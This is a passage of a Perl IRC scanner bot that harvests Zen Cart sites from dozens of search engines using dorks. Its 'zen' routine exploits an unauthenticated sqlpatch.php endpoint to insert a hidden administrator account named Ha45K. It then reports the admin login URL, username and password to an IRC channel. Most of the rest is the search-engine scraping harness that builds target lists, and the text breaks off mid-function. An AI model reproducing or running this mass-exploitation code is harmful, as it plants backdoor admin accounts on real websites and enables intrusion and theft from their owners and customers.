######################## ZEN
sub zen() {
    my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$zenlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$zenlogo12(4@0$engine12)10 Scan finish"); } }
            my $test  = "http://".$site."admin/sqlpatch.php/password_forgotten.php?action=execute";
            my $html  = &get_content($test);
               if ($html =~ /zc_install/){
                   &zen_query($chan,$site,$test,$engine);
                   }
               }
          }
     }
sub zen_query() {
    my $chan = $_[0];
    my $url = $_[1];
    my $test = $_[2];
   my $engine = $_[3];
    my $code  = "INSERT INTO admin (admin_id, admin_name, admin_email, admin_pass) VALUES (773,'Ha45K','Ha45K@hotmail.com','617ec22fbb8f201c366e9848c0eb6925:87');";
    my $req = HTTP::Request->new(POST => $test);
    $req->content_type("application/x-www-form-urlencoded");
    $req->content("query_string=".$code);
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(3);
    my $res = $ua->request($req);
    my $data = $res->as_string;
   if ( $data =~ /1 statements processed/i ) {
   &msg("$chan","$zenlogo12(4@0$engine12)(4@9VulN15)3 http://".$url."4admin/login.php 15(4@9user15)0 Ha45K 15(4@9pass15)0 wew");
   }
   elsif ( $data =~ /Duplicate entry/ ) {
   &msg("$chan","$zenlogo12(4@0$engine12)(4@9SuCcEs15)12 http://".$url."3admin/login.php 15(4@9user15)10 Ha45K 15(4@9pass15)10 wew");
   }
}

#########################################
sub search_engine() {
    my (@total,@clean);
   my ($chan,$bug,$dork,$engine,$logo) = @_;
    if ($engine eq "Google") { my @google = &google($dork); push(@total,@google); }               # 1
    if ($engine eq "Google2") { my @google2 = &google2($dork); push(@total,@google2); }                    # 2
   if ($engine eq "GigaBlast") { my @gigablast = &gigablast($dork); push(@total,@gigablast); }              # 3
   if ($engine eq "EuroSeek") { my @euroseek = &euroseek($dork); push(@total,@euroseek); }                 # 4
   if ($engine eq "Alltheweb") { my @alltheweb = &alltheweb($dork); push(@total,@alltheweb); }              # 5
    if ($engine eq "Rediff") { my @rediff = &rediff($dork); push(@total,@rediff); }               # 6
   if ($engine eq "Mamma") { my @mamma = &mamma($dork); push(@total,@mamma); }               # 7
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }                  # 8
    if ($engine eq "Altavista") { my @altavista = &altavista($dork); push(@total,@altavista); }                      # 9
    if ($engine eq "Yahoo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }                  # 10
   if ($engine eq "Yahoo2") { my @yahoo2 = &yahoo2($dork); push(@total,@yahoo2); }               # 11
    if ($engine eq "Ask") { my @ask = &ask($dork); push(@total,@ask); }                     # 12
    if ($engine eq "Uol") { my @uol = &uol($dork); push(@total,@uol); }                     # 13
    if ($engine eq "Clusty") { my @clusty = &clusty($dork); push(@total,@clusty); }               # 14
    if ($engine eq "Gutser") { my @gutser = &gutser($dork); push(@total,@gutser); }               # 15
    if ($engine eq "Exalead") { my @exalead = &exalead($dork); push(@total,@exalead); }                    # 16
    if ($engine eq "Lycos") { my @lycos = &lycos($dork); push(@total,@lycos); }                  # 17
    if ($engine eq "Virgilio") { my @virgilio = &virgilio($dork); push(@total,@virgilio); }                 # 18
    if ($engine eq "Webde") { my @webde = &webde($dork); push(@total,@webde); }                  # 19
    if ($engine eq "Hotbot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }               # 20
    if ($engine eq "Aol") { my @aol = &aol($dork); push(@total,@aol); }                     # 21
    if ($engine eq "Sapo") { my @sapo = &sapo($dork); push(@total,@sapo); }                  # 22
    if ($engine eq "Duck") { my @duck = &duck($dork); push(@total,@duck); }                  # 23
    if ($engine eq "Yause") { my @yause = &yause($dork); push(@total,@yause); }                  # 24
    if ($engine eq "Baidu") { my @baidu = &baidu($dork); push(@total,@baidu); }                  # 25
    if ($engine eq "Black") { my @black = &black($dork); push(@total,@black); }                  # 26
    if ($engine eq "Onet") { my @onet = &onet($dork); push(@total,@onet); }                  # 27
    if ($engine eq "Sizuka") { my @sizuka = &sizuka($dork); push(@total,@sizuka); }               # 28
    if ($engine eq "Walla") { my @walla = &walla($dork); push(@total,@walla); }                  # 29
    if ($engine eq "Demos") { my @demos = &demos($dork); push(@total,@demos); }                  # 30
    if ($engine eq "Rose") { my @rose = &rose($dork); push(@total,@rose); }                       # 31
    if ($engine eq "Seznam") { my @seznam = &seznam($dork); push(@total,@seznam); }               # 32
    if ($engine eq "Tiscali") { my @tiscali = &tiscali($dork); push(@total,@tiscali); }                    # 33
    if ($engine eq "Naver") { my @naver = &naver($dork); push(@total,@naver); }                  # 34
   if ($engine eq "AmiDalLa") { my @amidalla = &amidalla($dork); push(@total,@amidalla); }                 # 35
   if ($engine eq "BusCaR") { my @buscar = &buscar($dork); push(@total,@buscar); }               # 36
   if ($engine eq "KvaSiR") { my @kvasir = &kvasir($dork); push(@total,@kvasir); }               # 37
   if ($engine eq "eXciTe") { my @excite = &excite($dork); push(@total,@excite); }               # 38
   if ($engine eq "InteRia") { my @interia = &interia($dork); push(@total,@interia); }            # 39
   if ($engine eq "SnZ") { my @snz = &snz($dork); push(@total,@snz); }                  # 40
   if ($engine eq "RambLer") { my @rambler = &rambler($dork); push(@total,@rambler); }            # 41
   if ($engine eq "YaNdeX") { my @yandex = &yandex($dork); push(@total,@yandex); }               # 42
   ###### nieuwe ######         
   if ($engine eq "NetSprint") { my @netsprint = &netsprint($dork); push(@total,@netsprint); }              # 43
   if ($engine eq "sAol") { my @saol = &saol($dork); push(@total,@saol); }                  # 44
    if ($engine eq "Lookle") { my @lookle = &lookle($dork); push(@total,@lookle); }               # 45
    if ($engine eq "optusZoo") { my @optuszoo = &optuszoo($dork); push(@total,@optuszoo); }                 # 46
   if ($engine eq "Search66") { my @search66 = &search66($dork); push(@total,@search66); }                 # 47
   if ($engine eq "Arrama") { my @arrama = &arrama($dork); push(@total,@arrama); }               # 48
   if ($engine eq "eXciteJP") { my @excitejp = &excitejp($dork); push(@total,@excitejp); }                 # 49
    if ($engine eq "BigLobe") { my @biglobe = &biglobe($dork); push(@total,@biglobe); }            # 50
   if ($engine eq "Clix") { my @clix = &clix($dork); push(@total,@clix); }                  # 51
   if ($engine eq "SearchCH") { my @searchch = &searchch($dork); push(@total,@searchch); }                 # 52
   if ($engine eq "Cada") { my @cada = &cada($dork); push(@total,@cada); }                  # 53
   ####################
        @clean = &clean(@total);
   if ($conf{ssfind} == 1) {
      &msg("$chan","$logo12(4@0$engine12)8 ".scalar(@total)." 14-14´15§14ª14-13 ".scalar(@clean)." ");
   }
   return @clean;
}

#########################################

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = &get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

######################################### SEARCH ENGINE
sub google() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100){
        my $search = ("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /google/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub google2() {
  my @list;
  my $key = $_[0];
  my $b     = 0;
  my @doms = ("ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");
  foreach my $domain (@doms) { #$dom = $doms[rand(scalar(@doms))];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://www.google.".$domain."/search?num=50&q=".&key($key)."&start=".$b."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /google/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
}
#### -
sub gigablast(){
    my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://www.gigablast.com/search?q=".&key($key)."&n=".$b."");
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
        }
    }
    return @list;
}
#### ?
sub euroseek() {
   my @list;
   my $key = $_[0];
   for ($b=1; $b<=1000; $b+=100) {
      my $search = "http://euroseek.com/system/search.cgi?mode=internet&start=".$b."&string=".&key($key)."";
      my $link = &search_engine_query($search);
      while ( $link =~ m/http:\/\/(.+?)\//g) {
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
      }
   }
  return @list;
}
#### -
sub alltheweb() {
  my @list;
  my $key = $_[0];
    for ($i = 0;$i <= 1000;$i += 100) {
        my $search = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=500&q=".key($key)."&o=".$i."");
        my $res = &search_engine_query($search);
      while ($res =~ m/http:\/\/(.+?)\//g) {
            my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
        }
     }
     return @list;
}
############### GOED
sub rediff() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100) {
        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /rediff\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
         }
        }
    }
    return @list;
}
############### GOED
sub mamma(){
   my @list;
   my $key = $_[0];
   for($b=0;$b<=1000;$b+=100){
      my $Th=("http://www.mamma.com/result.php?q=".key($key)."&type=web&p=".$b);
      my $Res=&search_engine_query($Th);
      while($Res =~ m/target=\"_blank\">(.+?)\//g){
         if ($1 !~ /msn|live|google|yahoo/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
         }
      }
   }
return @list;
}
#### -
sub uol() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".&key($key)."&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
        }
    }
    return @list;
}
############### GOED
sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://www.bing.com/search?q=".&key($key)."&first=".$i."&FORM=PERE");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /bing\.com/) { my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub altavista() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100){
   my $search = ("http://search.yahoo.com/search?n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vd=all&vst=".$i."&vf=all&vm=p&fl=0&fr=altavista&p=".&key($key)."&vs=");
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub ask() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://uk.ask.com/web?q=".&key($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /ask\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub yahoo(){
    my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://search.yahoo.com/search?n=100&p=".&key($key)."&b=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub yahoo2() {
  my @list;
  my $key = $_[0];
  my $b     = 0;
  my @doms = ("at","au","br","ca","de","es","fr","it","uk");
  foreach my $domain (@doms) { #$dom = $doms[rand(scalar(@doms))];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://".$domain.".search.yahoo.com/search?n=100&p=".&key($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
}
############### GOED
sub clusty() {
    my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=10; $b<=1000; $b+=100) {
        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /yippy\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### +
sub gutser() {
    my @list;
    my $key = $_[0];
    for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://www.goodsearch.com/Search.aspx?Keywords=".&key($key)."&page=".$b."&osmax=0");
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /goodsearch|good\.is|w3\.org|quantserve/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### -
sub exalead() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\/\/(.+?)\//g) {
            my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    return @list;   
}   
############### GOED
sub lycos() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://search.lycos.com/?query=".&key($key)."&page2=".$b."&tab=web&searchArea=web&diktfc=468007302EF7DB9AFE53D4138B848E7B4000D424385F");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /lycos\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;   
}   
############### GOED
sub virgilio() {
  my @list;
  my $key = $_[0];
    for ($b=10; $b<=1000; $b+=100) {
        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".&key($key)."&filter=1&site=&lr=&hits=100&offset=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /\.virgilio\.it/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;   
}   
#### +
sub webde() {
  my @list;
  my $key = $_[0];
    for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".&key($key)."&search=Suche");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link!~ /suche|web/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;   
}
#### -
sub hotbot() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /hotbot/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;   
}
#### +   
sub aol() {
  my @list;
  my $key = $_[0];
    for ($b=2; $b<=1000; $b+=100) {
        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /aol/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;   
}
#### +
sub sapo(){
    my @list;
   my $key = $_[0];
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=100&location=pt&page=".$b."&q=".&key($key)."&st=local");
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /sapo/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub duck() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://duckduckgo.com/html/?q=".&key($key)."&l=us-en&p=".$b."&s=100&o=json&dc=54&api=d.js");
        my $res = &search_engine_query($search);
        while ($res =~ m/rel=\"nofollow\" href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /duckduckgo/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### -
sub yause() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /yauba\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub baidu() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://www.baidu.com/s?wd=".&key($key)."&pn=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /baidu\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub black() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://blekko.com/ws/".&key($key)."?ft=&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /blekko/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub onet() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /webcache|query/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub sizuka() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=10; $b<=1000; $b+=100) {
        my $search = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&q=".&key($key)."&start=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /szukacz/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### -
sub walla() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://search.walla.co.il/?t=0&e=utf&q=".&key($key)."&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /walla\.co\.il/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### -
sub demos() {
   my @list;
   my $key = $_[0];
    my $b   = 0;
   for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://search.dmoz.org/search/search?q=".&key($key)."&start=".$b."&type=next&all=yes");
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /search|dmoz/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### -
sub rose() {
  my @list;
  my $key = $_[0];
  my $b     = 0;
  my @langs = ("de","nl","fi","ps","da","en","es","fr","it","no","sv","cs","pl","ru");
   foreach my $language (@langs) { $lang = $langs[rand(scalar(@langs))];
    for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://euroseek.com/system/search.cgi?language=".$language."&mode=internet&start=".$b."&string=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /euroseek/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
}
############### GOED
sub seznam() {
   my @list;
   my $key = $_[0];
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://search.seznam.cz/?q=".&key($key)."&count=100&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /seznam/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### -
sub tiscali() {
   my @list;
   my $key = $_[0];
   for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/(.+?)\//g) {
            if ($1 !~ /tiscali/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### +
sub naver() {
   my @list;
   my $key = $_[0];
   for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://web.search.naver.com/search.naver?where=webkr&query=".&key($key)."&docid=0&lang=all&f=&srcharea=all&st=s&fd=2&start=".$b."&display=100");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            if ($1 !~ /naver/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### +
sub amidalla(){
    my @list;
    my $key = $_[0];
    my $i   = 0;
    for ($i=0; $i<=1000; $i+=100){
        my $web=("http://www.amidalla.de/cgi-bin/amisearch.cgi?search=".&key($key)."&page=".$i."&break=100&af=2&tld=com&et=2");      
        my $Res=&search_engine_query($web);
        while ($Res =~ m/href=\"http:\/\/(.+?)\//g){
            if ($1 !~ /amidalla/){ my $k=$1; $link =~ s/<//g; $link =~ s/ //g; my @grep=links($k); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### +
sub buscar() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100){
        my $search = ("http://buscar.ozu.es/index.php?etq=web&q=".&key($key)."&pag=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link !~ /buscar/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub kvasir() {
    my @list;
    my $key = $_[0];
    for (my $i=10; $i<=1000; $i+=100){
        my $search = ("http://www.kvasir.no/nettsok?offset=".$i."&pageSize=100&q=".&key($key)."");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link !~ /kvasir/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
#### -
sub excite(){
    my @list;
    my $key = $_[0];
    my $i   = 0;
    for ($i=0; $i<=1000; $i+=100){
        my $web=("http://msxml.excite.com/excite/ws/results/Web/".&key($key)."/".$i."/0/0/Relevance/zoom=off/qi=31/qk=10/bepersistence=true/_iceUrlFlag=7?_IceUrl=true");
        my $Res= &search_engine_query($web);
        while ($Res =~ m/href=\"http:\/\/(.+?)\//g){
            if ($1 !~ /excite/){ my $link=$1; $link =~ s/<//g; $link =~ s/ //g; my @grep=links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub interia() {
    my @list;
    my $key = $_[0];
    for ($i = 0;$i<= 1000; $i+= 100) {
           my $search = ( "http://www.google.interia.pl/szukaj?q=".&key($key)."&s=szukaj&w=sw&szukaj=&p=".$i);
           my $res = &search_engine_query($search);
           while ($res =~ m/text-decoration: none;\">http:\/\/(.+?)\/(.*)<\/a>/g) {
                my $link = $1; if ($link!~ /google|interia/) { $link =~ s/<//g; $link =~ s/ //g; my @grep=links($link); push(@list,@grep);
           }
       }
   }
  return @list;
}
#### +
sub snz() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://searchnz.co.nz/search.aspx?q=".&key($key)."&np=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link!~ /searchnz/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    }
    return @list;
}
############### GOED
sub rambler(){
    my @list;
    my $key = $_[0];
    for ($b=1; $b<=1000; $b++){
        my $search=("http://nova.rambler.ru/srch?btnG=DtD%B0DaN?D%B8!&query=".&key($key)."&page=".$b);
        my $res= &search_engine_query($search);
        while ($res =~ m/<a target=\"_blank\" href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link!~ /rambler|nova|cache/ ){ $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    }
   return @list;
}
#### +
sub yandex(){
    my @list;
    my $key = $_[0];
    for ($b=0; $b<=1000; $b+=100){
        my $search=("http://yandex.ru/yandsearch?p=".$b."&text=".&key($key)."&lr=118");
        my $res= &search_engine_query($search);
        while ($res =~ m/<a class=\"b-serp-item__title-link\" tabindex=\"2\" href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link!~ /yandex/ ){ $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    }
   return @list;
}
############### NIEUWE ###############
sub netsprint(){
   my @list;
   my $key = $_[0];
   for($b=1;$b<=1000;$b+=100){
      my $Th=("http://www.netsprint.pl/serwis/search?q=".key($key)."&rpp=10&pg=".$b."&ff=0&z=1&format=-1");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/target=\"_blank\" href=\"http:\/\/(.+?)\//g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
         }
      }
   return @list;
}
sub saol(){
   my @list;
   my $key = $_[0];
   for($b=1;$b<=1000;$b+=100){
      my $Th=("http://search.aol.com/aol/search?enabled_terms=&q=".key($key)."&s_it=comsearch50&page=".$b."&oreq=810a106cf821477ab0349f9caa875f82&v_t=comsearch50");
      my $Res=&search_engine_query($Th);
      while($Res =~ m/<span property=\"f:durl\">(.+?)<\/span>/g){
         my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
      }
   }
return @list;
}
sub lookle(){
